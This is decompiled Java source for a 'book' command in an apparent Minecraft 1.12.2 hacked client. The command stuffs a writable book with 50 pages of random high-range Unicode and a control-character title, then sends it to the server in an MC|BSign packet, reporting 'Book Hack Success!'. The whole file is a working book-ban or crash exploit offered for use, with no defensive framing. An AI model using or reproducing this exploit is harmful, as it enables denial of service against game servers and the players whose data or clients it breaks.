//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\1.12.2"!

/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  io.netty.buffer.Unpooled
 *  net.minecraft.init.Items
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTBase
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.nbt.NBTTagString
 *  net.minecraft.network.Packet
 *  net.minecraft.network.PacketBuffer
 *  net.minecraft.network.play.client.CPacketCustomPayload
 */
package me.snow.aclient.command.commands;

import io.netty.buffer.Unpooled;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import me.snow.aclient.AliceMain;
import me.snow.aclient.command.Command;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;

public class BookCommand
extends Command {
    @Override
    public void execute(String[] arrstring) {
        ItemStack itemStack = BookCommand.mc.player.getHeldItemMainhand();
        if (itemStack.getItem() == Items.WRITABLE_BOOK) {
            Random random = new Random();
            IntStream intStream = random.ints(128, 1112063).map(n -> n < 55296 ? n : n + 2048);
            String string = intStream.limit(10500L).mapToObj(n -> String.valueOf((char)n)).collect(Collectors.joining());
            NBTTagList nBTTagList = new NBTTagList();
            for (int i = 0; i < 50; ++i) {
                nBTTagList.appendTag((NBTBase)new NBTTagString(string.substring(i * 210, (i + 1) * 210)));
            }
            if (itemStack.hasTagCompound()) {
                assert (itemStack.getTagCompound() != null);
                itemStack.getTagCompound().setTag("pages", (NBTBase)nBTTagList);
            } else {
                itemStack.setTagInfo("pages", (NBTBase)nBTTagList);
            }
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 0; i < 16; ++i) {
                stringBuilder.append("\u0014\f");
            }
            itemStack.setTagInfo("author", (NBTBase)new NBTTagString(BookCommand.mc.player.getName()));
            itemStack.setTagInfo("title", (NBTBase)new NBTTagString(String.valueOf(stringBuilder)));
            PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
            packetBuffer.writeItemStackToBuffer(itemStack);
            BookCommand.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", packetBuffer));
            BookCommand.sendMessage(String.valueOf(new StringBuilder().append(AliceMain.commandManager.getPrefix()).append("Book Hack Success!")));
        } else {
            BookCommand.sendMessage(String.valueOf(new StringBuilder().append(AliceMain.commandManager.getPrefix()).append("b1g 3rr0r!")));
        }
    }

    public BookCommand() {
        super("book", new String[0]);
    }
}

